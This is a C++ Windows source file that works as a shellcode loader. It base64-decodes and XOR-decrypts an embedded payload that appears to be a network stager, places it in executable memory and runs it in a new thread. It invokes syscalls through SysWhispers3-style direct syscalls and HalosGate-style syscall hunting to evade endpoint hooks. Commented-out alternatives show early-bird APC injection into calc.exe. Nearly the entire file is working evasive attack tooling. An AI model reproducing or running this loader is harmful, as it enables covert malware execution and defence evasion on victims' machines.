// demo1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include "header.h"
#include "base64.h"
#include "nt.h"
using namespace std;

unsigned char* ReadProcessBlob(const char* fnamSc, DWORD* szSc)
{
	DWORD szRead{ 0 };

	HANDLE hFile = CreateFileA(
		fnamSc,
		GENERIC_READ,
		NULL,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (INVALID_HANDLE_VALUE == hFile)
		return nullptr;

	SIZE_T szFile = GetFileSize(hFile, NULL);
	*szSc = szFile;

	unsigned char* raw = new unsigned char[szFile];
	unsigned char* sc = new unsigned char[szFile];

	if (!ReadFile(hFile, raw, szFile, &szRead, NULL))
		return nullptr;

	int i;

	for (i = 0; i < szRead; i++) {
		sc[i] = raw[i] ^ XOR_KEY;
	}

	return sc;
}


std::string replace(const std::string& inStr, const char* pSrc, const char* pReplace)

{
	std::string str = inStr;
	std::string::size_type stStart = 0;
	std::string::iterator iter = str.begin();
	while (iter != str.end())

	{
		std::string::size_type st = str.find(pSrc, stStart);

		if (st == str.npos)

		{
			break;
		}

		iter = iter + st - stStart;
		str.replace(iter, iter + strlen(pSrc), pReplace);
		iter = iter + strlen(pReplace);
		stStart = st + strlen(pReplace);
	}

	return str;

}

LPVOID GetSuitableBaseAddress(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv)
{
	MEMORY_BASIC_INFORMATION mbi;

	for (auto base : VC_PREF_BASES) {
		VirtualQueryEx(
			hProc,
			base,
			&mbi,
			sizeof(MEMORY_BASIC_INFORMATION)
		);

		if (MEM_FREE == mbi.State) {
			uint64_t i;
			for (i = 0; i < cVmResv; ++i) {
				LPVOID currentBase = (void*)((DWORD_PTR)base + (i * szAllocGran));
				VirtualQueryEx(
					hProc,
					currentBase,
					&mbi,
					sizeof(MEMORY_BASIC_INFORMATION)
				);
				if (MEM_FREE != mbi.State)
					break;
			}
			if (i == cVmResv) {
				// found suitable base
				return base;
			}
		}
	}
	return nullptr;
}

#ifdef _M_IX86

EXTERN_C PVOID internal_cleancall_wow64_gate(VOID) {
	return (PVOID)__readfsdword(0xC0);
}

__declspec(naked) BOOL local_is_wow64(void)
{
	__asm {
		mov eax, fs: [0xc0]
		test eax, eax
		jne wow64
		mov eax, 0
		ret
		wow64 :
		mov eax, 1
			ret
	}
}


#endif

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW3_SYSCALL_LIST SW3_SyscallList;

// SEARCH_AND_REPLACE
#ifdef SEARCH_AND_REPLACE
// THIS IS NOT DEFINED HERE; don't know if I'll add it in a future release
EXTERN void SearchAndReplace(unsigned char[], unsigned char[]);
#endif

DWORD SW3_HashSyscall(PCSTR FunctionName)
{
	DWORD i = 0;
	DWORD Hash = SW3_SEED;

	while (FunctionName[i])
	{
		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
		Hash ^= PartialName + SW3_ROR8(Hash);
	}

	return Hash;
}

#ifndef JUMPER
PVOID SC_Address(PVOID NtApiAddress)
{
	return NULL;
}
#else
PVOID SC_Address(PVOID NtApiAddress)
{
	DWORD searchLimit = 512;
	PVOID SyscallAddress;

#ifdef _WIN64
	// If the process is 64-bit on a 64-bit OS, we need to search for syscall
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;
#else
	// If the process is 32-bit on a 32-bit OS, we need to search for sysenter
	BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
	ULONG distance_to_syscall = 0x0f;
#endif

#ifdef _M_IX86
	// If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
	if (local_is_wow64())
	{
#ifdef DEBUG
		printf("[+] Running 32-bit app on x64 (WOW64)\n");
#endif
		return NULL;
	}
#endif

	// we don't really care if there is a 'jmp' between
	// NtApiAddress and the 'syscall; ret' instructions
	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
	{
		// we can use the original code for this system call :)
#if defined(DEBUG)
		printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
		return SyscallAddress;
	}

	// the 'syscall; ret' intructions have not been found,
	// we will try to use one near it, similarly to HalosGate

	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
	{
		// let's try with an Nt* API below our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
#if defined(DEBUG)
			printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
			return SyscallAddress;
		}

		// let's try with an Nt* API above our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
#if defined(DEBUG)
			printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
			return SyscallAddress;
		}
	}

#ifdef DEBUG
	printf("Syscall Opcodes not found!\n");
#endif

	return NULL;
}
#endif


BOOL SW3_PopulateSyscallList()
{
	// Return early if the list is already populated.
	if (SW3_SyscallList.Count) return TRUE;

#ifdef _WIN64
	PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
#else
	PSW3_PEB Peb = (PSW3_PEB)__readfsdword(0x30);
#endif
	PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
	PVOID DllBase = NULL;

	// Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
	// in the list, so it's safer to loop through the full list and find it.
	PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
	for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
	{
		DllBase = LdrEntry->DllBase;
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
		PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
		PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
		DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (VirtualAddress == 0) continue;

		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

		// If this is NTDLL.dll, exit loop.
		PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

		if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
		if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
	}

	if (!ExportDirectory) return FALSE;

	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	// Populate SW3_SyscallList with unsorted Zw* entries.
	DWORD i = 0;
	PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
	do
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

		// Is this a system call?
		if (*(USHORT*)FunctionName == 0x775a)
		{
			Entries[i].Hash = SW3_HashSyscall(FunctionName);
			Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
			Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));

			i++;
			if (i == SW3_MAX_ENTRIES) break;
		}
	} while (--NumberOfNames);

	// Save total number of system calls found.
	SW3_SyscallList.Count = i;

	// Sort the list by address in ascending order.
	for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
	{
		for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
		{
			if (Entries[j].Address > Entries[j + 1].Address)
			{
				// Swap entries.
				SW3_SYSCALL_ENTRY TempEntry;

				TempEntry.Hash = Entries[j].Hash;
				TempEntry.Address = Entries[j].Address;
				TempEntry.SyscallAddress = Entries[j].SyscallAddress;

				Entries[j].Hash = Entries[j + 1].Hash;
				Entries[j].Address = Entries[j + 1].Address;
				Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;

				Entries[j + 1].Hash = TempEntry.Hash;
				Entries[j + 1].Address = TempEntry.Address;
				Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
			}
		}
	}

	return TRUE;
}

EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return -1;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return i;
		}
	}

	return -1;
}

EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return SW3_SyscallList.Entries[i].SyscallAddress;
		}
	}

	return NULL;
}

EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	DWORD index = ((DWORD)rand()) % SW3_SyscallList.Count;

	while (FunctionHash == SW3_SyscallList.Entries[index].Hash) {
		// Spoofing the syscall return address
		index = ((DWORD)rand()) % SW3_SyscallList.Count;
	}
	return SW3_SyscallList.Entries[index].SyscallAddress;
}



int main()
{
	bool all_tests_passed = false;

	std::string rest2_reference = "9ECL7PjgwAgICElZSVhaWV5AOdptQINaaECDWhBAg1ooQIN6WEAHv0JCRTnBQDnIpDRpdAokKEnJwQVJCcnq5VpJWUCDWiiDSjRACdhuiXAQAwp9eoOIgAgICECNyHxvQAnYWINAEEyDSChBCdjrXkD3wUmDPIBACd5FOcFAOcikScnBBUkJyTDofflEC0QsAE0x2X3QUEyDSCxBCdhuSYMEQEyDSBRBCdhJgwyAQAnYSVBJUFZRUklQSVFJUkCL5ChJWvfoUElRUkCDGuFH9/f3VWIIQbZ/YWZhZm18CEleQYHuRIH5SbJEfy4P991AOcFAOdpFOchFOcFJWElYSbIyXnGv993je1JAgclJsFgICAhFOcFJWUlZYgtJWUmyX4GXzvfd41FTQIHJQDnaQYHQRTnBWmAICkiMWlpJsuNdJjP33UCBzkCLy1hiAldAgflAgdJBz8j39/f3RTnBWlpJsiUOEHP33Y3IB42VCQgIQPfHB4yECQgI49vh7AkICOCq9/f3J0V8UEwIQShDvCCeEfnGqz4QOUCZb1k9zZRfrP2kaoTlwQZQ+aY4tgZwQlaNp0lYfmGOcGoGYzblJRLD9V4TH2y6c1s4iOAMlePMttdpgghde216JUlvbWZ8MihFZ3JhZGRpJzwmOCgga2dleGl8YWpkbTMoRVtBTSg/JjgzKF9hZmxnf3soRlwoPSY5IQUCCM1l6QoDmhAeJZoutN1CPkoMbBYRT4p4JodhVtQQ/QXiL7U61RfcwKRjFq95GITSknVDXEYydGh4NjiMRT6a43pevMz6zCoiQMDcYy/1jHjhWWvhVp/6TPSIiL5RP8LaSwpz++6FswyGtYnKUJ+da0rRw4YW4GE1isJ9yBukKGBzCetRpZrAZtf8AZPUpuLRg9gLYdXFeifw5yhKxN4jy6BQV14m/VHXb2WO3XrQXc7c0CxfgIM1rYMHGVMH6y9uyurrF7uMzIg+sptJ4pFTYuzDslBKxx4+qcw2ikCPTsks2vAe8rGqLYAwlP4+eRcISbb4vape991AOcGyCAhICEmwCBgICEmxSAgICEmyUKxb7ffdQJtbW0CB70CB+UCB0kmwCCgICEGB8UmyGp6B6vfdQIvMKI3IfL5ugw9ACcuNyH3fUFBQQA0ICAgIWMvgl/X39zkxOiY5PjAmOCY5OzkIWQG3ZQ@@";

	std::string rest3_reference = replace(rest2_reference, "@@", "==");

	std::string rest2_decoded = base64_decode(rest3_reference);

	const char* S = rest2_decoded.c_str();




	HANDLE hProc = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		8696
	);

	SYSTEM_INFO sys_inf;
	GetSystemInfo(&sys_inf);

	DWORD page_size{ sys_inf.dwPageSize };
	DWORD alloc_gran{ sys_inf.dwAllocationGranularity };

	SIZE_T szVmResv{ alloc_gran };
	SIZE_T szVmCmm{ page_size };
	DWORD  cVmResv = (rest2_decoded.length() / szVmResv) + 1;
	DWORD  cVmCmm = szVmResv / szVmCmm;

	LPVOID vmBaseAddress = GetSuitableBaseAddress(
		hProc,
		szVmCmm,
		szVmResv,
		cVmResv
	);
	LPVOID    currentVmBase{ vmBaseAddress };
	NTSTATUS  status{ 0 };
	vector<LPVOID>  vcVmResv;

	//alloc memeory
	for (int i = 1; i <= cVmResv; ++i)
	{

		status = BNtAVM(
			hProc,
			&currentVmBase,
			NULL,
			&szVmResv,
			MEM_RESERVE,
			PAGE_NOACCESS
		);
		if (STATUS_SUCCESS == status) {
			vcVmResv.push_back(currentVmBase);
		}
		else {

			std::cout << "AVM error";
		}
		currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
	}

	DWORD           offsetSc{ 0 };
	DWORD           oldProt;

	double prcDone{ 0 };

	DWORD     cmm_i;
	for (int i = 0; i < cVmResv; ++i)
	{
		unsigned char* sc = new unsigned char[szVmCmm];
		for (int j = 0; j < szVmCmm; j++) {
			//cout << szVmCmm * i + j << endl;
			sc[j] = S[szVmCmm * i + j] ^ XOR_KEY;
		}

		void* exec = VirtualAlloc(0, cVmResv, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(exec, sc, rest2_decoded.length());

		//((void(*)())exec)();

		/*
		HANDLE hThread = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)exec,
			NULL,
			0,
			NULL);
		if (hThread == NULL)
		{
			return 1;
		}

		WaitForSingleObject(hThread, INFINITE);

		CloseHandle(hThread);
	}*/


	/*
	CreateThread

	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)exec,
		NULL,
		0,
		NULL);
	if (hThread == NULL)
	{
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	*/


	//eariler bird APC
		/*
		SIZE_T shellSize = 4096;
		STARTUPINFOA si = { 0 };
		PROCESS_INFORMATION pi = { 0 };

		CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE victimProcess = pi.hProcess;
		HANDLE threadHandle = pi.hThread;

		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

		WriteProcessMemory(victimProcess, shellAddress, exec, shellSize, NULL);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		ResumeThread(threadHandle);
		*/


		//((void(*)())exec)();
		HANDLE hThread{ nullptr };
		ANtCTE(
			&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			GetCurrentProcess(),
			(LPTHREAD_START_ROUTINE)exec,
			NULL,
			NULL,
			0,
			0,
			0,
			nullptr
		);
		WaitForSingleObject(hThread, INFINITE);

	}
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
